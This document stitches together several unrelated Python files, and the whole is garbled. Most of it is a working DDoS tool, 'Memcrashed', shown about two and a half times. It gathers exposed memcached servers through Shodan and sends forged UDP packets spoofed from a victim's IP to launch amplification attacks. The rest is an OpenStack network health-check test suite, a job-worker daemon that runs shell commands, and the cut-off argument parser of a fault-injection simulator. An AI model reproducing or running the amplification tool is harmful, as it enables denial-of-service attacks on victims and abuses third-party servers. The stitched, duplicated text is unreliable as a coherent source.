                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
            print('')
            engage = input('[*] Ready to engage target %s? <Y/n>: ' % target).lower()
            if engage.startswith('y'):
                if saveme.startswith('y'):
                    for i in ip_array:
                        if power>1:                    
                            print('[+] Sending %d forged UDP packets to: %s' % (power, i))                    
                            with suppress_stdout():                    
                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)                    
                        elif power==1:                    
                            print('[+] Sending 1 forged UDP packet to: %s' % i)                    
                            with suppress_stdout():                    
                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)                    
                else:
                    for result in results['matches']:
                        if power>1:                    
                            print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))                    
                            with suppress_stdout():                    
                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)                    
                        elif power==1:                    
                            print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])                    
                            with suppress_stdout():                    
                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)                    
                print('')
                print('[•] Task complete! Exiting Platform. Have a wonderful day.')
                break
            else:
                print('')
                print('[✘] Error: %s not engaged!' % target)
                print('[~] Restarting Platform! Please wait.')
                print('')
        else:
            print('')
            print('[✘] Error: No bots stored locally or remotely on Shodan!')
            print('[~] Restarting Platform! Please wait.')
            print('')

    except shodan.APIError as e:
            print('[✘] Error: %s' % e)
            option = input('[*] Would you like to change API Key? <Y/n>: ').lower()
            if option.startswith('y'):
                file = open('api.txt', 'w')
                SHODAN_API_KEY = input('[*] Please enter valid Shodan.io API Key: ')
                file.write(SHODAN_API_KEY)
                print('[~] File written: ./api.txt')
                file.close()
                print('[~] Restarting Platform! Please wait.')
                print('')
            else:
                print('')
                print('[•] Exiting Platform. Have a wonderful day.')
                break

#-- coding: utf8 --
#!/usr/bin/env python3
import sys, os, time, shodan
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager, redirect_stdout

starttime = time.time()

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield

class color:
    HEADER = '\033[0m'

keys = Path("./api.txt")
logo = color.HEADER + '''

   ███╗   ███╗███████╗███╗   ███╗ ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗ 
   ████╗ ████║██╔════╝████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
   ██╔████╔██║█████╗  ██╔████╔██║██║     ██████╔╝███████║███████╗███████║█████╗  ██║  ██║
   ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██║     ██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██║  ██║
   ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║╚██████╗██║  ██║██║  ██║███████║██║  ██║███████╗██████╔╝
   ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝ 

                                        Author: @037
                                        Version: 3.2                    

####################################### DISCLAIMER ########################################
| Memcrashed is a tool that allows you to use Shodan.io to obtain hundreds of vulnerable  |
| memcached servers. It then allows you to use the same servers to launch widespread      |
| distributed denial of service attacks by forging UDP packets sourced to your victim.    |
| Default payload includes the memcached "stats" command, 10 bytes to send, but the reply |
| is between 1,500 bytes up to hundreds of kilobytes. Please use this tool responsibly.   |
| I am NOT responsible for any damages caused or any crimes committed by using this tool. |
###########################################################################################
                                                                                      
'''
print(logo)

if keys.is_file():
    with open('api.txt', 'r') as file:
        SHODAN_API_KEY=file.readline().rstrip('\n')
else:
    file = open('api.txt', 'w')
    SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ')
    file.write(SHODAN_API_KEY)
    print('[~] File written: ./api.txt')
    file.close()

while True:
    api = shodan.Shodan(SHODAN_API_KEY)
    print('')
    try:
        myresults = Path("./bots.txt")
        query = input("[*] Use Shodan API to search for affected Memcached servers? <Y/n>: ").lower()
        if query.startswith('y'):
            print('')
            print('[~] Checking Shodan.io API Key: %s' % SHODAN_API_KEY)
            results = api.search('product:"Memcached" port:11211')
            print('[✓] API Key Authentication: SUCCESS')
            print('[~] Number of bots: %s' % results['total'])
            print('')
            saveresult = input("[*] Save results for later usage? <Y/n>: ").lower()
            if saveresult.startswith('y'):
                file2 = open('bots.txt', 'a')
                for result in results['matches']:
                    file2.write(result['ip_str'] + "\n")
                print('[~] File written: ./bots.txt')
                print('')
                file2.close()
        saveme = input('[*] Would you like to use locally stored Shodan data? <Y/n>: ').lower()
        if myresults.is_file():
            if saveme.startswith('y'):
                with open('bots.txt') as my_file:
                    ip_array = [line.rstrip() for line in my_file]
        else:
            print('')
            print('[✘] Error: No bots stored locally, bots.txt file not found!')
            print('')
        if saveme.startswith('y') or query.startswith('y'):
            print('')
            target = input("[▸] Enter target IP address: ")
            power = int(input("[▸] Enter preferred power (Default 1): ") or "1")
            data = input("[▸] Enter payload contained inside packet: ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"                    
            print('')
            if query.startswith('y'):
                iplist = input('[*] Would you like to display all the bots from Shodan? <Y/n>: ').lower()
                if iplist.startswith('y'):
                    print('')
                    counter= int(0)
                    for result in results['matches']:
                        host = api.host('%s' % result['ip_str'])
                        counter=counter+1
                        print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, result['ip_str'], host.get('os', 'n/a'), host.get('org', 'n/a')))
                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
            if saveme.startswith('y'):
                iplistlocal = input('[*] Would you like to display all the bots stored locally? <Y/n>: ').lower()
                if iplistlocal.startswith('y'):
                    print('')
                    counter= int(0)
                    for x in ip_array:
                        host = api.host('%s' % x)
                        counter=counter+1
                        print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, x, host.get('os', 'n/a'), host.get('org', 'n/a')))
                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
            print('')
            engage = input('[*] Ready to engage target %s? <Y/n>: ' % target).lower()
            if engage.startswith('y'):
                if saveme.startswith('y'):
                    for i in ip_array:
                        if power>1:                    
                            print('[+] Sending %d forged UDP packets to: %s' % (power, i))                    
                            with suppress_stdout():                    
                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)                    
                        elif power==1:                    
                            print('[+] Sending 1 forged UDP packet to: %s' % i)                    
                            with suppress_stdout():                    
                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)                    
                else:
                    for result in results['matches']:
                        if power>1:                    
                            print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))                    
                            with suppress_stdout():                    
                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)                    
                        elif power==1:                    
                            print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])                    
                            with suppress_stdout():                    
                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)                    
                print('')
                print('[•] Task complete! Exiting Platform. Have a wonderful day.')
                break
            else:
                print('')
                print('[✘] Error: %s not engaged!' % target)
                print('[~] Restarting Platform! Please wait.')
                print('')
        else:
            print('')
            print('[✘] Error: No bots stored locally or remotely on Shodan!')
            print('[~] Restarting Platform! Please wait.')
            print('')

    except shodan.APIError as e:
            print('[✘] Error: %s' % e)
            option = input('[*] Would you like to change API Key? <Y/n>: ').lower()
            if option.startswith('y'):
                file = open('api.txt', 'w')
                SHODAN_API_KEY = input('[*] Please enter valid Shodan.io API Key: ')
                file.write(SHODAN_API_KEY)
                print('[~] File written: ./api.txt')
                file.close()
                print('[~] Restarting Platform! Please wait.')
                print('')
            else:
                print('')
                print('[•] Exiting Platform. Have a wonderful day.')
                break

#-- coding: utf8 --
#!/usr/bin/env python3
import sys, os, time, shodan
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager, redirect_stdout

starttime = time.time()

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield

class color:
    HEADER = '\033[0m'

keys = Path("./api.txt")
logo = color.HEADER + '''

   ███╗   ███╗███████╗███╗   ███╗ ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗ 
   ████╗ ████║██╔════╝████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
   ██╔████╔██║█████╗  ██╔████╔██║██║     ██████╔╝███████║███████╗███████║█████╗  ██║  ██║
   ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██║     ██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██║  ██║
   ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║╚██████╗██║  ██║██║  ██║███████║██║  ██║███████╗██████╔╝
   ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝ 

                                        Author: @037
                                        Version: 3.2                    

####################################### DISCLAIMER ########################################
| Memcrashed is a tool that allows you to use Shodan.io to obtain hundreds of vulnerable  |
| memcached servers. It then allows you to use the same servers to launch widespread      |
| distributed denial of service attacks by forging UDP packets sourced to your victim.    |
| Default payload includes the memcached "stats" command, 10 bytes to send, but the reply |
| is between 1,500 bytes up to hundreds of kilobytes. Please use this tool responsibly.   |
| I am NOT responsible for any damages caused or any crimes committed by using this tool. |
###########################################################################################
                                                                                      
'''
print(logo)

if keys.is_file():
    with open('api.txt', 'r') as file:
        SHODAN_API_KEY=file.readline().rstrip('\n')
else:
    file = open('api.txt', 'w')
    SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ')
    file.write(SHODAN_API_KEY)
    print('[~] File written: ./api.txt')
    file.close()

while True:
    api = shodan.Shodan(SHODAN_API_KEY)
    print('')
    try:
        myresults = Path("./bots.txt")
        query = input("[*] Use Shodan API to search for affected Memcached servers? <Y/n>: ").lower()
        if query.startswith('y'):
            print('')
            print('[~] Checking Shodan.io API Key: %s' % SHODAN_API_KEY)
            results = api.search('product:"Memcached" port:11211')
            print('[✓] API Key Authentication: SUCCESS')
            print('[~] Number of bots: %s' % results['total'])
            print('')
            saveresult = input("[*] Save results for later usage? <Y/n>: ").lower()
            if saveresult.startswith('y'):
                file2 = open('bots.txt', 'a')
                for result in results['matches']:
                    file2.write(result['ip_str'] + "\n")
                print('[~] File written: ./bots.txt')
                print('')
                file2.close()
        saveme = input('[*] Would you like to use locally stored Shodan data? <Y/n>: ').lower()
        if myresults.is_file():
            if saveme.startswith('y'):
                with open('bots.txt') as my_file:
                    ip_array = [line.rstrip() for line in my_file]
        else:
            print('')
            print('[✘] Error: No bots stored locally, bots.txt file not found!')
            print('')
        if saveme.startswith('y') or query.startswith('y'):
            print('')
            target = input("[▸] Enter target IP address: ")
            power = int(input("[▸] Enter preferred power (Default 1): ") or "1")
            data = input("[▸] Enter payload contained inside packet: ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"                    
            print('')
            if query.startswith('y'):
                iplist = input('[*] Would you like to display all the bots from Shodan? <Y/n>: ').lower()
                if iplist.startswith('y'):
                    print('')
                    counter= int(0)
                    for result in results['matches']:
                        host = api.host('%s' % result['ip_str'])
                        counter=counter+1
                        print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, result['ip_str'], host.get('os', 'n/a'), host.get('org', 'n/a')))
                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
            if saveme.startswith('y'):
                iplistlocal = input('[*] Would you like to display all the bots stored locally? <Y/n>: ').lower()
                if iplistlocal.startswith('y'):
                    print('')
                    counter= int(0)
                    for x in ip_array:
                        host = api.host('%s' % x)
                        counter=counter+1
                        print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, x, host.get('os', 'n/a'), host.get('org', 'n/a')))
                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
            print('')
            engage = input('[*] Ready to engage target %s? <Y/n>: ' % target).lower()
            if engage.startswith('y'):
                if saveme.startswith('y'):
                    for i in ip_array:
                        if power>1:                    
                            print('[+] Sending %d forged UDP packets to: %s' % (power, i))                    
                            with suppress_stdout():                    
                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)                    
                        elif power==1:                    
                            print('[+] Sending 1 forged UDP packet to: %s' % i)                    
                            with suppress_stdout():                    
                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)                    
                else:
                    for result in results['matches']:
                        if power>1:                    
                            print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))                    
                            with suppress_stdout():                    
                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)                    
                        elif power==1:                    
                            print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])                    
                            with suppress_stdout():                    
                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)                    
                print('')
                print('[•] Task complete! Exiting Platform. Have a wonderful day.')
                break
            else:
                print('')
                print('[✘] Error: %s not engaged!' % target)
                print('[~] Restarting Platform! Please wait.')
                print('')
        else:
            print('')
            print('[✘] Error: No bots stored locally or remotely on Shodan!')
            print('[~] Restarting Platform! Please wait.')
            print('')

    except shodan.APIError as e:
            print('[✘] Error: %s' % e)
            option = input('[*] Would you like to change API Key? <Y/n>: ').lower()
            if option.startswith('y'):
                file = open('api.txt', 'w')
                SHODAN_API_KEY = input('[*] Please enter valid Shodan.io API Key: ')
                file.write(SHODAN_API_KEY)
                print('[~] File written: ./api.txt')
                file.close()
                print('[~] Restarting Platform! Please wait.')
                print('')
            else:
                print('')
                print('[•] Exiting Platform. Have a wonderful day.')
                break

# vim: tabstop=4 shiftwidth=4 softtabstop=4

# Copyright 2013 OpenStack, LLC
# Copyright 2013 Mirantis, Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License"); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.

import logging
import traceback

from fuel_health.common.utils.data_utils import rand_name
from fuel_health import nmanager

LOG = logging.getLogger(__name__)


class TestNovaNetwork(nmanager.NovaNetworkScenarioTest):
    """Test suit verifies:
     - keypairs creation
     - security groups creation
     - Network creation
     - Instance creation
     - Floating ip creation
     - Instance connectivity by floating IP
    """
    @classmethod
    def setUpClass(cls):
        super(TestNovaNetwork, cls).setUpClass()
        if cls.manager.clients_initialized:
            cls.tenant_id = cls.manager._get_identity_client(
                cls.config.identity.admin_username,
                cls.config.identity.admin_password,
                cls.config.identity.admin_tenant_name).tenant_id
            cls.keypairs = {}
            cls.security_groups = {}
            cls.network = []
            cls.servers = []
            cls.floating_ips = []

    def setUp(self):
        super(TestNovaNetwork, self).setUp()
        self.check_clients_state()
        if not self.config.compute.compute_nodes:
            self.skipTest('There are no compute nodes')

    def tearDown(self):
        super(TestNovaNetwork, self).tearDown()
        if self.manager.clients_initialized:
            if self.servers:
                for server in self.servers:
                    try:
                        self._delete_server(server)
                        self.servers.remove(server)
                    except Exception:
                        LOG.debug(traceback.format_exc())
                        LOG.debug("Server was already deleted.")

    def test_001_create_keypairs(self):
        """Create keypair
        Target component: Nova.

        Scenario:
            1. Create a new keypair, check if it was created successfully.
        Duration: 25 s.

        """
        self.keypairs[self.tenant_id] = self.verify(30,
                                                    self._create_keypair,
                                                    1,
                                                    'Keypair can not be'
                                                    ' created.',
                                                    'keypair creation',
                                                    self.compute_client)

    def test_002_create_security_groups(self):
        """Create security group
        Target component: Nova

        Scenario:
            1. Create a security group, check if it was created correctly.
        Duration: 25 s.

        """
        self.security_groups[self.tenant_id] = self.verify(
            25, self._create_security_group, 1,
            "Security group can not be created.",
            'security group creation',
            self.compute_client)

    def test_003_check_networks(self):
        """Check network parameters
        Target component: Nova

        Scenario:
            1. Get the list of networks.
            2. Confirm that networks have expected labels.
            3. Confirm that networks have expected ids.
        Duration: 50 s.

        """
        seen_nets = self.verify(
            50,
            self._list_networks,
            1,
            "List of networks is not available.",
            'listing networks'
        )
        seen_labels, seen_ids = zip(*((n.label, n.id) for n in seen_nets))
        for mynet in self.network:
            self.verify_response_body(seen_labels, mynet.label,
                                      ('Network can not be created.'
                                       'properly'), failed_step=2)
            self.verify_response_body(seen_ids, mynet.id,
                                      ('Network can not be created.'
                                       ' properly '), failed_step=3)

    def test_004_create_servers(self):
        """Launch instance
        Target component: Nova

        Scenario:
            1. Create a new security group (if it doesn`t exist yet).
            2. Create an instance using the new security group.
            3. Delete instance.
        Duration: 200 s.

        """
        self.check_image_exists()
        if not self.security_groups:
            self.security_groups[self.tenant_id] = self.verify(
                25,
                self._create_security_group,
                1,
                "Security group can not be created.",
                'security group creation',
                self.compute_client)

        name = rand_name('ost1_test-server-smoke-')
        security_groups = [self.security_groups[self.tenant_id].name]

        server = self.verify(
            200,
            self._create_server,
            2,
            "Creating instance using the new security group has failed.",
            'image creation',
            self.compute_client, name, security_groups
        )

        self.verify(30, self._delete_server, 3,
                    "Server can not be deleted.",
                    "server deletion", server)

    def test_008_check_public_instance_connectivity_from_instance(self):
        """Check network connectivity from instance via floating IP
        Target component: Nova

        Scenario:
            1. Create a new security group (if it doesn`t exist yet).
            2. Create an instance using the new security group.
            3. Create a new floating IP
            4. Assign the new floating IP to the instance.
            5. Check connectivity to the floating IP using ping command.
            6. Check that public IP 8.8.8.8 can be pinged from instance.
            7. Disassociate server floating ip.
            8. Delete floating ip
            9. Delete server.
        Duration: 300 s.

        Deployment tags: nova_network
        """
        self.check_image_exists()
        if not self.security_groups:
                self.security_groups[self.tenant_id] = self.verify(
                    25, self._create_security_group, 1,
                    "Security group can not be created.",
                    'security group creation',
                    self.compute_client)

        name = rand_name('ost1_test-server-smoke-')
        security_groups = [self.security_groups[self.tenant_id].name]

        server = self.verify(250, self._create_server, 2,
                             "Server can not be created.",
                             "server creation",
                             self.compute_client, name, security_groups)

        floating_ip = self.verify(
            20,
            self._create_floating_ip,
            3,
            "Floating IP can not be created.",
            'floating IP creation')

        self.verify(20, self._assign_floating_ip_to_instance,
                    4, "Floating IP can not be assigned.",
                    'floating IP assignment',
                    self.compute_client, server, floating_ip)

        self.floating_ips.append(floating_ip)

        ip_address = floating_ip.ip
        LOG.info('is address is  {0}'.format(ip_address))
        LOG.debug(ip_address)

        self.verify(600, self._check_vm_connectivity, 5,
                    "VM connectivity doesn`t function properly.",
                    'VM connectivity checking', ip_address,
                    30, (9, 60))

        self.verify(600, self._check_connectivity_from_vm,
                    6, ("Connectivity to 8.8.8.8 from the VM doesn`t "
                        "function properly."),
                    'public connectivity checking from VM', ip_address,
                    30, (9, 60))

        self.verify(20, self.compute_client.servers.remove_floating_ip,
                    7, "Floating IP cannot be removed.",
                    "removing floating IP", server, floating_ip)

        self.verify(20, self.compute_client.floating_ips.delete,
                    8, "Floating IP cannot be deleted.",
                    "floating IP deletion", floating_ip)

        if self.floating_ips:
            self.floating_ips.remove(floating_ip)

        self.verify(30, self._delete_server, 9,
                    "Server can not be deleted. ",
                    "server deletion", server)

    def test_006_check_internet_connectivity_instance_without_floatingIP(self):
        """Check network connectivity from instance without floating IP
        Target component: Nova

        Scenario:
            1. Create a new security group (if it doesn`t exist yet).
            2. Create an instance using the new security group.
            (if it doesn`t exist yet).
            3. Check that public IP 8.8.8.8 can be pinged from instance.
            4. Delete server.
        Duration: 300 s.

        Deployment tags: nova_network
        """
        self.check_image_exists()
        if not self.security_groups:
            self.security_groups[self.tenant_id] = self.verify(
                25, self._create_security_group, 1,
                "Security group can not be created.",
                'security group creation', self.compute_client)

        name = rand_name('ost1_test-server-smoke-')
        security_groups = [self.security_groups[self.tenant_id].name]

        server = self.verify(
            250, self._create_server, 2,
            "Server can not be created.",
            'server creation',
            self.compute_client, name, security_groups)

        try:
            for addr in server.addresses:
                if addr.startswith('novanetwork'):
                    instance_ip = server.addresses[addr][0]['addr']
            if not self.config.compute.use_vcenter:
                compute = getattr(server, 'OS-EXT-SRV-ATTR:host')
            else:
                compute = None
        except Exception:
            LOG.debug(traceback.format_exc())
            self.fail("Step 3 failed: cannot get instance details. "
                      "Please refer to OpenStack logs for more details.")

        self.verify(600, self._check_connectivity_from_vm,
                    3, ("Connectivity to 8.8.8.8 from the VM doesn`t "
                        "function properly."),
                    'public connectivity checking from VM',
                    instance_ip, 30, (9, 30), compute)

        self.verify(30, self._delete_server, 4,
                    "Server can not be deleted. ",
                    "server deletion", server)

    def test_009_create_server_with_file(self):
        """Launch instance with file injection
        Target component: Nova

        Scenario:
            1. Create a new security group (if it doesn`t exist yet).
            2. Create an instance with injected file.
            3. Assign floating ip to instance.
            4. Check file exists on created instance.
            5. Delete floating ip.
            6. Delete instance.
        Duration: 200 s.
        Available since release: 2014.2-6.1
        """
        self.check_image_exists()
        if not self.security_groups:
            self.security_groups[self.tenant_id] = self.verify(
                25,
                self._create_security_group,
                1,
                "Security group can not be created.",
                'security group creation',
                self.compute_client)

        name = rand_name('ost1_test-server-smoke-file_inj-')
        security_groups = [self.security_groups[self.tenant_id].name]

        data_file = {"/home/cirros/server.txt": self._load_file('server.txt')}
        server = self.verify(
            300,
            self._create_server,
            2,
            "Creating instance using the new security group has failed.",
            'instance creation',
            self.compute_client, name, security_groups,  data_file=data_file
        )

        floating_ip = self.verify(
            20,
            self._create_floating_ip,
            3,
            "Floating IP can not be created.",
            'floating IP creation')

        self.verify(20, self._assign_floating_ip_to_instance,
                    3, "Floating IP can not be assigned.",
                    'floating IP assignment',
                    self.compute_client, server, floating_ip)

        self.floating_ips.append(floating_ip)

        ip_address = floating_ip.ip

        self.verify(
            600, self._run_command_from_vm,
            4, "Can not find injected file on instance.",
            'check if injected file exists', ip_address,
            30, (9, 60),                    
            '[ -f /home/cirros/server.txt ] && echo "True" || echo "False"')

        self.verify(20, self.compute_client.servers.remove_floating_ip,
                    5, "Floating IP cannot be removed.",
                    "removing floating IP", server, floating_ip)

        self.verify(20, self.compute_client.floating_ips.delete,
                    5, "Floating IP cannot be deleted.",
                    "floating IP deletion", floating_ip)

        if self.floating_ips:
            self.floating_ips.remove(floating_ip)

        self.verify(30, self._delete_server, 6,
                    "Server can not be deleted. ",
                    "server deletion", server)

#!/usr/bin/env python
"""Worker script."""
import os
import time
import uuid
import random
# import json
# import shlex
import socket
import subprocess
from urlparse import urlsplit, urlunsplit
from tempfile import NamedTemporaryFile
from contextlib import contextmanager

from requests.exceptions import Timeout

from pdm.framework.RESTClient import RESTClient, RESTException
from pdm.cred.CredClient import CredClient
from pdm.endpoint.EndpointClient import EndpointClient
from pdm.utils.daemon import Daemon
from pdm.utils.config import getConfig

from .WorkqueueDB import COMMANDMAP, PROTOCOLMAP, JobType


@contextmanager
def TempX509Files(token):
    """Create temporary grid credential files."""
    cert, key = CredClient().get_cred(token)
    with NamedTemporaryFile() as proxyfile:
        proxyfile.write(key)
        proxyfile.write(cert)
        proxyfile.flush()
        os.fsync(proxyfile.fileno())
        yield proxyfile


class Worker(RESTClient, Daemon):
    """Worker Daemon."""

    def __init__(self, debug=False, one_shot=False):
        """Initialisation."""
        RESTClient.__init__(self, 'workqueue')
        conf = getConfig('worker')
        self._uid = uuid.uuid4()
        Daemon.__init__(self,
                        pidfile='/tmp/worker-%s.pid' % self._uid,
                        logfile='/tmp/worker-%s.log' % self._uid,
                        target=self.run,
                        debug=debug)
        self._one_shot = one_shot
        self._types = [JobType[type_.upper()] for type_ in  # pylint: disable=unsubscriptable-object
                       conf.pop('types', ('LIST', 'COPY', 'REMOVE'))]
        self._interpoll_sleep_time = conf.pop('poll_time', 2)
        self._script_path = conf.pop('script_path', None)                    
        if self._script_path:                    
            self._script_path = os.path.abspath(self._script_path)                    
        else:                    
            code_path = os.path.abspath(os.path.dirname(__file__))                    
            self._script_path = os.path.join(code_path, 'scripts')                    
        self._logger.info("Script search path is: %s", self._script_path)                    
        self._current_process = None
        # Check for unused config options
        if conf:
            keys = ', '.join(conf.keys())                    
            raise ValueError("Unused worker config params: '%s'" % keys)                    

    def terminate(self, *_):
        """Terminate worker daemon."""
        Daemon.terminate(self, *_)
        if self._current_process is not None:
            self._current_process.terminate()

    def _abort(self, job_id, message):
        """Abort job cycle."""
        self._logger.error("Error with job %d: %s", job_id, message)
        try:
            self.put('worker/%s' % job_id,
                     data={'log': message,
                           'returncode': 1,
                           'host': socket.gethostbyaddr(socket.getfqdn())})
        except RESTException:
            self._logger.exception("Error trying to PUT back abort message")

    def run(self):
        """Daemon main method."""
        endpoint_client = EndpointClient()
        run = True
        while run:
            if self._one_shot:
                run = False
            try:
                response = self.post('worker', data={'types': self._types})
            except Timeout:
                self._logger.warning("Timed out contacting the WorkqueueService.")
                continue
            except RESTException as err:
                if err.code == 404:
                    self._logger.debug("No work to pick up.")
                    time.sleep(self._interpoll_sleep_time)
                else:                    
                    self._logger.exception("Error trying to get job from WorkqueueService.")
                continue
            job, token = response
#            try:
#                job, token = json.loads(response.data())
#            except ValueError:
#                self._logger.exception("Error decoding JSON job.")
#                continue
            src_site = endpoint_client.get_site(job['src_siteid'])
            src_endpoints = [urlsplit(site) for site
                             in src_site['endpoints'].itervalues()]
            src = [urlunsplit(site._replace(path=job['src_filepath'])) for site in src_endpoints
                   if site.scheme == PROTOCOLMAP[job['protocol']]]
            if not src:
                self._abort(job['id'], "Protocol '%s' not supported at src site with id %d"
                            % (job['protocol'], job['src_siteid']))
                continue
            command = "%s %s" % (COMMANDMAP[job['type']][job['protocol']], random.choice(src))                    

            if job['type'] == JobType.COPY:
                if job['dst_siteid'] is None:
                    self._abort(job['id'], "No dst site id set for copy operation")
                    continue
                if job['dst_filepath'] is None:
                    self._abort(job['id'], "No dst site filepath set for copy operation")
                    continue

                dst_site = endpoint_client.get_site(job['dst_siteid'])
                dst_endpoints = [urlsplit(site) for site
                                 in dst_site['endpoints'].itervalues()]
                dst = [urlunsplit(site._replace(path=job['dst_filepath'])) for site in dst_endpoints
                       if site.scheme == PROTOCOLMAP[job['protocol']]]
                if not dst:
                    self._abort(job['id'], "Protocol '%s' not supported at dst site with id %d"
                                % (job['protocol'], job['dst_siteid']))
                    continue
                command += " %s" % random.choice(dst)                    

            with TempX509Files(job['credentials']) as proxyfile:
                self._current_process = subprocess.Popen('(set -x && %s)' % command,
                                                         shell=True,
                                                         stdout=subprocess.PIPE,
                                                         stderr=subprocess.STDOUT,
                                                         env=dict(os.environ,                    
                                                                  PATH=self._script_path,                    
                                                                  X509_USER_PROXY=proxyfile.name))                    
                log, _ = self._current_process.communicate()
                self.set_token(token)
                try:
                    self.put('worker/%s' % job['id'],
                             data={'log': log,
                                   'returncode': self._current_process.returncode,
                                   'host': socket.gethostbyaddr(socket.getfqdn())})
                except RESTException:
                    self._logger.exception("Error trying to PUT back output from subcommand.")
                finally:
                    self.set_token(None)


#!/usr/bin/env python3
from argparse import ArgumentParser

import utilities

# TODO: add option for device password
# TODO: add options for custom error messages
# TODO: use formatting strings
# TODO: add ip address override
# TODO: remove output image buttons if not needed from log viewer result page
# TODO: move rsakey back into campaign_data/db
# TODO: add boot commands option
# TODO: add modes to backup database and delete backups
# TODO: add mode to redo injection iteration
# TODO: add fallback to power cycle when resetting dut
# TODO: add support for injection of multi-bit upsets
# TODO: add option for number of times to rerun app for latent fault case
# TODO: change Exception in simics.py to DrSEUsError

parser = ArgumentParser(
    description='The Dynamic Robust Single Event Upset Simulator '
                'was created by Ed Carlisle IV',
    epilog='Begin by creating a new campaign with "%(prog)s new APPLICATION". '
           'Then run injections with "%(prog)s inject".')
parser.add_argument('-C', '--campaign', action='store', type=int, metavar='ID',
                    dest='campaign_id', default=0,
                    help='campaign to use, defaults to last campaign created')
parser.add_argument('-D', '--debug', action='store_true', dest='debug',
                    help='display device output for parallel injections')
parser.add_argument('-T', '--timeout', action='store', type=int,
                    metavar='SECONDS', dest='timeout', default=300,
                    help='device read timeout [default=300]')
parser.add_argument('--serial', action='store', metavar='PORT',
                    dest='dut_serial_port',
                    help='DUT serial port [p2020 default=/dev/ttyUSB1] '
                         '[a9 default=/dev/ttyACM0] (overridden by Simics)')
parser.add_argument('--baud', action='store', type=int, metavar='RATE',
                    dest='dut_baud_rate', default=115200,
                    help='DUT serial port baud rate [default=115200]')
parser.add_argument('--scp', action='store', type=int, metavar='PORT',
                    dest='dut_scp_port', default=22,
                    help='DUT scp port [default=22] (overridden by Simics)')
parser.add_argument('--prompt', action='store', metavar='PROMPT',
                    dest='dut_prompt',
                    help='DUT console prompt [p2020 default=root@p2020rdb:~#] '
                         '[a9 default=[root@ZED]#] (overridden by Simics)')
parser.add_argument('--user', action='store', dest='username', default='root',
                    help='device username')
parser.add_argument('--pass', action='store', dest='password', default='chrec',
                    help='device password')
parser.add_argument('--uboot', action='store', metavar='COMMAND',
                    dest='dut_uboot', default='', help='DUT u-boot command')
parser.add_argument('--aux_serial', action='store', metavar='PORT',
                    dest='aux_serial_port',
                    help='AUX serial port [p2020 default=/dev/ttyUSB1] '
                         '[a9 default=/dev/ttyACM0] (overridden by Simics)')
parser.add_argument('--aux_baud', action='store', type=int, metavar='RATE',
                    dest='aux_baud_rate', default=115200,
                    help='AUX serial port baud rate [default=115200]')
parser.add_argument('--aux_scp', action='store', type=int, metavar='PORT',
                    dest='aux_scp_port', default=22,
